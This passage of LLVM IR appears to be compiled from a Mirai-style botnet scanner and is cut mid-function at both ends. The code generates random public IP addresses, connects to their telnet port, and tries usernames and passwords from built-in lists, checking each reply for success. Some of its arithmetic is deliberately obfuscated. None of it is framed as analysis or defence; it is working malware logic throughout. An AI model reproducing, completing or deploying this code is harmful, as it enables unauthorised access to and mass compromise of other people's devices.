  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 7
  store i32 %103, i32* %107, align 16
  br label %108

; <label>:108:                                    ; preds = %102, %95
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = zext i8 %113 to i32
  switch i32 %114, label %733 [
    i32 0, label %115
    i32 1, label %261
    i32 2, label %381
    i32 3, label %429
    i32 4, label %474
    i32 5, label %523
    i32 6, label %568
    i32 7, label %669
  ]

; <label>:115:                                    ; preds = %108
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 3
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 1
  br i1 %122, label %123, label %143

; <label>:123:                                    ; preds = %115
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 9
  %128 = load i8*, i8** %127, align 8
  store i8* %128, i8** %20, align 8
  %129 = load i32, i32* %5, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %130
  %132 = bitcast %struct.telstate_t* %131 to i8*
  call void @llvm.memset.p0i8.i64(i8* %132, i8 0, i64 32, i32 16, i1 false)
  %133 = load i8*, i8** %20, align 8
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 9
  store i8* %133, i8** %137, align 8
  %138 = call i32 @GetRandomPublicIP()
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 1
  store i32 %138, i32* %142, align 4
  br label %198

; <label>:143:                                    ; preds = %115
  %144 = load i32, i32* %5, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 3
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 0
  br i1 %150, label %151, label %197

; <label>:151:                                    ; preds = %143
  %152 = load i32, i32* %5, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 5
  %156 = load i8, i8* %155, align 1
  %157 = sub i8 0, %156
  %158 = sub i8 0, 1
  %159 = add i8 %157, %158
  %160 = sub i8 0, %159
  %161 = add i8 %156, 1
  store i8 %160, i8* %155, align 1
  %162 = load i32, i32* %5, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 4
  %166 = load i8, i8* %165, align 2
  %167 = sub i8 %166, -92
  %168 = add i8 %167, 1
  %169 = add i8 %168, -92
  %170 = add i8 %166, 1
  store i8 %169, i8* %165, align 2
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 5
  %175 = load i8, i8* %174, align 1
  %176 = zext i8 %175 to i64
  %177 = icmp eq i64 %176, 9
  br i1 %177, label %178, label %183

; <label>:178:                                    ; preds = %151
  %179 = load i32, i32* %5, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 3
  store i8 1, i8* %182, align 1
  br label %734

; <label>:183:                                    ; preds = %151
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 4
  %188 = load i8, i8* %187, align 2
  %189 = zext i8 %188 to i64
  %190 = icmp eq i64 %189, 9
  br i1 %190, label %191, label %196

; <label>:191:                                    ; preds = %183
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 3
  store i8 1, i8* %195, align 1
  br label %734

; <label>:196:                                    ; preds = %183
  br label %197

; <label>:197:                                    ; preds = %196, %143
  br label %198

; <label>:198:                                    ; preds = %197, %123
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %199, align 4
  %200 = call zeroext i16 @htons(i16 zeroext 23) #13
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %200, i16* %201, align 2
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %203 = getelementptr inbounds [8 x i8], [8 x i8]* %202, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %203, i8 0, i64 8, i32 4, i1 false)
  %204 = load i32, i32* %5, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 1
  %208 = load i32, i32* %207, align 4
  %209 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %210 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %209, i32 0, i32 0
  store i32 %208, i32* %210, align 4
  %211 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %212 = load i32, i32* %5, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  store i32 %211, i32* %215, align 16
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 16
  %221 = icmp eq i32 %220, -1
  br i1 %221, label %222, label %223

; <label>:222:                                    ; preds = %198
  br label %734

; <label>:223:                                    ; preds = %198
  %224 = load i32, i32* %5, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = load i32, i32* %5, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 16
  %234 = call i32 (i32, i32, ...) @fcntl(i32 %233, i32 3, i8* null)
  %235 = and i32 %234, 2048
  %236 = xor i32 %234, 2048
  %237 = or i32 %235, %236
  %238 = or i32 %234, 2048
  %239 = call i32 (i32, i32, ...) @fcntl(i32 %228, i32 4, i32 %237)
  %240 = load i32, i32* %5, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 16
  %245 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %246 = call i32 @connect(i32 %244, %struct.sockaddr* %245, i32 16)
  %247 = icmp eq i32 %246, -1
  br i1 %247, label %248, label %256

; <label>:248:                                    ; preds = %223
  %249 = call i32* @__errno_location() #13
  %250 = load i32, i32* %249, align 4
  %251 = icmp ne i32 %250, 115
  br i1 %251, label %252, label %256

; <label>:252:                                    ; preds = %248
  %253 = load i32, i32* %5, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %254
  call void @reset_telstate(%struct.telstate_t* %255)
  br label %260

; <label>:256:                                    ; preds = %248, %223
  %257 = load i32, i32* %5, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %258
  call void @advance_state(%struct.telstate_t* %259, i32 1)
  br label %260

; <label>:260:                                    ; preds = %256, %252
  br label %733

; <label>:261:                                    ; preds = %108
  br label %262

; <label>:262:                                    ; preds = %261
  %263 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %264 = getelementptr inbounds [16 x i64], [16 x i64]* %263, i64 0, i64 0
  %265 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %264) #2, !srcloc !6
  %266 = extractvalue { i64, i64* } %265, 0
  %267 = extractvalue { i64, i64* } %265, 1
  %268 = trunc i64 %266 to i32
  store i32 %268, i32* %21, align 4
  %269 = ptrtoint i64* %267 to i64
  %270 = trunc i64 %269 to i32
  store i32 %270, i32* %22, align 4
  br label %271

; <label>:271:                                    ; preds = %262
  br label %272

; <label>:272:                                    ; preds = %271
  %273 = load i32, i32* %5, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 16
  %278 = srem i32 %277, 64
  %279 = zext i32 %278 to i64
  %280 = shl i64 1, %279
  %281 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %282 = load i32, i32* %5, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = sdiv i32 %286, 64
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds [16 x i64], [16 x i64]* %281, i64 0, i64 %288
  %290 = load i64, i64* %289, align 8
  %291 = xor i64 %290, -1
  %292 = xor i64 %280, -1
  %293 = xor i64 -736326032194275089, -1
  %294 = and i64 %291, -736326032194275089
  %295 = and i64 %290, %293
  %296 = and i64 %292, -736326032194275089
  %297 = and i64 %280, %293
  %298 = or i64 %294, %295
  %299 = or i64 %296, %297
  %300 = xor i64 %298, %299
  %301 = or i64 %291, %292
  %302 = xor i64 %301, -1
  %303 = or i64 -736326032194275089, %293
  %304 = and i64 %302, %303
  %305 = or i64 %300, %304
  %306 = or i64 %290, %280
  store i64 %305, i64* %289, align 8
  %307 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %307, align 8
  %308 = load i32, i32* %3, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %309, i64* %310, align 8
  %311 = load i32, i32* %5, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = sub i32 0, 1
  %317 = sub i32 %315, %316
  %318 = add nsw i32 %315, 1
  %319 = call i32 @select(i32 %317, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %319, i32* %6, align 4
  %320 = load i32, i32* %6, align 4
  %321 = icmp eq i32 %320, 1
  br i1 %321, label %322, label %357

; <label>:322:                                    ; preds = %272
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %323 = load i32, i32* %5, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 0
  %327 = load i32, i32* %326, align 16
  %328 = bitcast i32* %15 to i8*
  %329 = call i32 @getsockopt(i32 %327, i32 1, i32 4, i8* %328, i32* %14) #2
  %330 = load i32, i32* %15, align 4
  %331 = icmp ne i32 %330, 0
  br i1 %331, label %332, label %336

; <label>:332:                                    ; preds = %322
  %333 = load i32, i32* %5, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %334
  call void @reset_telstate(%struct.telstate_t* %335)
  br label %356

; <label>:336:                                    ; preds = %322
  %337 = load i32, i32* %5, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = load i32, i32* %5, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 0
  %346 = load i32, i32* %345, align 16
  %347 = call i32 (i32, i32, ...) @fcntl(i32 %346, i32 3, i8* null)
  %348 = xor i32 -2049, -1
  %349 = xor i32 %347, %348
  %350 = and i32 %349, %347
  %351 = and i32 %347, -2049
  %352 = call i32 (i32, i32, ...) @fcntl(i32 %341, i32 4, i32 %350)
  %353 = load i32, i32* %5, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %354
  call void @advance_state(%struct.telstate_t* %355, i32 2)
  br label %356

; <label>:356:                                    ; preds = %336, %332
  br label %734

; <label>:357:                                    ; preds = %272
  %358 = load i32, i32* %6, align 4
  %359 = icmp eq i32 %358, -1
  br i1 %359, label %360, label %364

; <label>:360:                                    ; preds = %357
  %361 = load i32, i32* %5, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %362
  call void @reset_telstate(%struct.telstate_t* %363)
  br label %734

; <label>:364:                                    ; preds = %357
  br label %365

; <label>:365:                                    ; preds = %364
  %366 = load i32, i32* %5, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 7
  %370 = load i32, i32* %369, align 16
  %371 = sub i32 0, 5
  %372 = sub i32 %370, %371
  %373 = add i32 %370, 5
  %374 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %375 = icmp ult i32 %372, %374
  br i1 %375, label %376, label %380

; <label>:376:                                    ; preds = %365
  %377 = load i32, i32* %5, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %378
  call void @reset_telstate(%struct.telstate_t* %379)
  br label %380

; <label>:380:                                    ; preds = %376, %365
  br label %733

; <label>:381:                                    ; preds = %108
  %382 = load i32, i32* %5, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 16
  %387 = load i32, i32* %3, align 4
  %388 = load i32, i32* %5, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 9
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @read_until_response(i32 %386, i32 %387, i8* %392, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %394 = icmp ne i32 %393, 0
  br i1 %394, label %395, label %412

; <label>:395:                                    ; preds = %381
  %396 = load i32, i32* %5, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 9
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @contains_fail(i8* %400)
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %395
  %404 = load i32, i32* %5, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %405
  call void @advance_state(%struct.telstate_t* %406, i32 0)
  br label %411

; <label>:407:                                    ; preds = %395
  %408 = load i32, i32* %5, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %409
  call void @advance_state(%struct.telstate_t* %410, i32 3)
  br label %411

; <label>:411:                                    ; preds = %407, %403
  br label %734

; <label>:412:                                    ; preds = %381
  %413 = load i32, i32* %5, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 7
  %417 = load i32, i32* %416, align 16
  %418 = sub i32 %417, -1771772786
  %419 = add i32 %418, 7
  %420 = add i32 %419, -1771772786
  %421 = add i32 %417, 7
  %422 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %423 = icmp ult i32 %420, %422
  br i1 %423, label %424, label %428

; <label>:424:                                    ; preds = %412
  %425 = load i32, i32* %5, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %426
  call void @reset_telstate(%struct.telstate_t* %427)
  br label %428

; <label>:428:                                    ; preds = %424, %412
  br label %733

; <label>:429:                                    ; preds = %108
  %430 = load i32, i32* %5, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 16
  %435 = load i32, i32* %5, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 4
  %439 = load i8, i8* %438, align 2
  %440 = zext i8 %439 to i64
  %441 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %440
  %442 = load i8*, i8** %441, align 8
  %443 = load i32, i32* %5, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 4
  %447 = load i8, i8* %446, align 2
  %448 = zext i8 %447 to i64
  %449 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %448
  %450 = load i8*, i8** %449, align 8
  %451 = call i64 @strlen(i8* %450) #10
  %452 = call i64 @send(i32 %434, i8* %442, i64 %451, i32 16384)
  %453 = icmp slt i64 %452, 0
  br i1 %453, label %454, label %458

; <label>:454:                                    ; preds = %429
  %455 = load i32, i32* %5, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %456
  call void @reset_telstate(%struct.telstate_t* %457)
  br label %734

; <label>:458:                                    ; preds = %429
  %459 = load i32, i32* %5, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 0
  %463 = load i32, i32* %462, align 16
  %464 = call i64 @send(i32 %463, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %465 = icmp slt i64 %464, 0
  br i1 %465, label %466, label %470

; <label>:466:                                    ; preds = %458
  %467 = load i32, i32* %5, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %468
  call void @reset_telstate(%struct.telstate_t* %469)
  br label %734

; <label>:470:                                    ; preds = %458
  %471 = load i32, i32* %5, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %472
  call void @advance_state(%struct.telstate_t* %473, i32 4)
  br label %733

; <label>:474:                                    ; preds = %108
  %475 = load i32, i32* %5, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 0
  %479 = load i32, i32* %478, align 16
  %480 = load i32, i32* %3, align 4
  %481 = load i32, i32* %5, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 9
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @read_until_response(i32 %479, i32 %480, i8* %485, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %487 = icmp ne i32 %486, 0
  br i1 %487, label %488, label %505

; <label>:488:                                    ; preds = %474
  %489 = load i32, i32* %5, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %490
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %491, i32 0, i32 9
  %493 = load i8*, i8** %492, align 8
  %494 = call i32 @contains_fail(i8* %493)
  %495 = icmp ne i32 %494, 0
  br i1 %495, label %496, label %500

; <label>:496:                                    ; preds = %488
  %497 = load i32, i32* %5, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %498
  call void @advance_state(%struct.telstate_t* %499, i32 0)
  br label %504

; <label>:500:                                    ; preds = %488
  %501 = load i32, i32* %5, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %502
  call void @advance_state(%struct.telstate_t* %503, i32 5)
  br label %504

; <label>:504:                                    ; preds = %500, %496
  br label %734

; <label>:505:                                    ; preds = %474
  %506 = load i32, i32* %5, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 7
  %510 = load i32, i32* %509, align 16
  %511 = sub i32 0, %510
  %512 = sub i32 0, 3
  %513 = add i32 %511, %512
  %514 = sub i32 0, %513
  %515 = add i32 %510, 3
  %516 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %517 = icmp ult i32 %514, %516
  br i1 %517, label %518, label %522

; <label>:518:                                    ; preds = %505
  %519 = load i32, i32* %5, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %520
  call void @reset_telstate(%struct.telstate_t* %521)
  br label %522

; <label>:522:                                    ; preds = %518, %505
  br label %733

; <label>:523:                                    ; preds = %108
  %524 = load i32, i32* %5, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 0
  %528 = load i32, i32* %527, align 16
  %529 = load i32, i32* %5, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 5
  %533 = load i8, i8* %532, align 1
  %534 = zext i8 %533 to i64
  %535 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %534
  %536 = load i8*, i8** %535, align 8
  %537 = load i32, i32* %5, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 5
  %541 = load i8, i8* %540, align 1
  %542 = zext i8 %541 to i64
  %543 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %542
  %544 = load i8*, i8** %543, align 8
  %545 = call i64 @strlen(i8* %544) #10
  %546 = call i64 @send(i32 %528, i8* %536, i64 %545, i32 16384)
  %547 = icmp slt i64 %546, 0
  br i1 %547, label %548, label %552

; <label>:548:                                    ; preds = %523
  %549 = load i32, i32* %5, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %550
  call void @reset_telstate(%struct.telstate_t* %551)
  br label %734

; <label>:552:                                    ; preds = %523
  %553 = load i32, i32* %5, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 0
  %557 = load i32, i32* %556, align 16
  %558 = call i64 @send(i32 %557, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %559 = icmp slt i64 %558, 0
  br i1 %559, label %560, label %564

; <label>:560:                                    ; preds = %552
  %561 = load i32, i32* %5, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %562
  call void @reset_telstate(%struct.telstate_t* %563)
  br label %734

; <label>:564:                                    ; preds = %552
  %565 = load i32, i32* %5, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %566
  call void @advance_state(%struct.telstate_t* %567, i32 6)
  br label %733

; <label>:568:                                    ; preds = %108
  %569 = load i32, i32* %5, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 0
  %573 = load i32, i32* %572, align 16
  %574 = load i32, i32* %3, align 4
  %575 = load i32, i32* %5, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 9
  %579 = load i8*, i8** %578, align 8
  %580 = call i32 @read_until_response(i32 %573, i32 %574, i8* %579, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %581 = icmp ne i32 %580, 0
  br i1 %581, label %582, label %652

; <label>:582:                                    ; preds = %568
  %583 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %584 = load i32, i32* %5, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 7
  store i32 %583, i32* %587, align 16
  %588 = load i32, i32* %5, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 9
  %592 = load i8*, i8** %591, align 8
  %593 = call i32 @contains_fail(i8* %592)
  %594 = icmp ne i32 %593, 0
  br i1 %594, label %595, label %599

; <label>:595:                                    ; preds = %582
  %596 = load i32, i32* %5, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %597
  call void @advance_state(%struct.telstate_t* %598, i32 0)
  br label %651

; <label>:599:                                    ; preds = %582
  %600 = load i32, i32* %5, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @contains_success(i8* %604)
